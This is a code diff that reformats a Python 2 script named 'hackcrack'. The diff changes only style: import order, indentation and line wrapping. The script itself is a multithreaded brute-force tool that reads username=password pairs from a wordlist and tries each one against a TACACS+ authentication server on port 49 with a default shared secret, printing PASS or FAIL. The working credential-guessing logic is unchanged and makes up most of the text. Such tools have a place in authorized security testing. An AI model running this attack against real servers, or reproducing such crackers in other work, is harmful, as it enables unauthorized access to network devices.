@@ -2,12 +2,13 @@
 from __future__ import print_function
 
 import getopt
-import threading
-from itertools import islice
-from tacacs_plus.client import TACACSClient
 import socket
 import sys
+import threading
+from itertools import islice
+
 import Queue
+from tacacs_plus.client import TACACSClient
 
 
 class hackcrack(threading.Thread):
@@ -16,24 +17,35 @@ class hackcrack(threading.Thread):
         self.chunk = chunk
 
     def run(self):
-        print("new threading processing "+str(len(self.chunk)))
+        print("new threading processing " + str(len(self.chunk)))
         for line in self.chunk:
-                line.strip("\n")
-                print("new auth: "+str((line)))
+            line.strip("\n")
+            print("new auth: " + str((line)))
 
-                try:
-                    username = line.split("=")[0].strip()
-                    password = line.split("=")[1].strip()
-                    print("sproof auth with username:"+ username + " passwd: "+password+" host "+host+" secretkey "+secretkey)
-                    cli = TACACSClient(host, 49, secretkey, timeout=10, family=socket.AF_INET)
-                    # 使用用户名和密码认证
-                    authen = cli.authenticate(username, password)
-                    #authen = cli.authenticate("mason", "1231")
-                    print("PASS!" if authen.valid else "FAIL!")
-                except Exception as e:
-                    print("auth exception")
-                    print(e)
-                    pass
+            try:
+                username = line.split("=")[0].strip()
+                password = line.split("=")[1].strip()
+                print(
+                    "sproof auth with username:"
+                    + username
+                    + " passwd: "
+                    + password
+                    + " host "
+                    + host
+                    + " secretkey "
+                    + secretkey
+                )
+                cli = TACACSClient(
+                    host, 49, secretkey, timeout=10, family=socket.AF_INET
+                )
+                # 使用用户名和密码认证
+                authen = cli.authenticate(username, password)
+                # authen = cli.authenticate("mason", "1231")
+                print("PASS!" if authen.valid else "FAIL!")
+            except Exception as e:
+                print("auth exception")
+                print(e)
+                pass
 
 
 def info():
@@ -64,9 +76,11 @@ def crack(chunk):
         x.join()
 
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     try:
-        opts, args = getopt.getopt(sys.argv[1:], "w:H:s:", ["help", "wordlist", "host", "secretkey"])
+        opts, args = getopt.getopt(
+            sys.argv[1:], "w:H:s:", ["help", "wordlist", "host", "secretkey"]
+        )
     except getopt.GetoptError as err:
         print(str(err.msg))
         info()
@@ -75,11 +89,11 @@ if __name__ == '__main__':
     keepGoing = False
     secretkey = "testing123"
     authfile = ""
-    numperprocess=1000;
-    chunks=[]
-    host=""
-    username=""
-    password=""
+    numperprocess = 1000
+    chunks = []
+    host = ""
+    username = ""
+    password = ""
 
     for o, a in opts:
         if o in ("-h", "--help"):
@@ -104,7 +118,7 @@ if __name__ == '__main__':
         info()
 
     # 提供字典
-    if "" !=authfile:
+    if "" != authfile:
         with open(authfile) as f:
             while True:
                 next_n_lines = list(islice(f, numperprocess))
@@ -119,7 +133,15 @@ if __name__ == '__main__':
     if "" != username and "" != password and "" != host:
         try:
             print(
-                "sproof auth with username:" + username + " passwd: " + password + " host " + host + " secretkey " + secretkey)
+                "sproof auth with username:"
+                + username
+                + " passwd: "
+                + password
+                + " host "
+                + host
+                + " secretkey "
+                + secretkey
+            )
             cli = TACACSClient(host, 49, secretkey, timeout=10, family=socket.AF_INET)
             authen = cli.authenticate(username, password)
             print("PASS!" if authen.valid else "FAIL!")
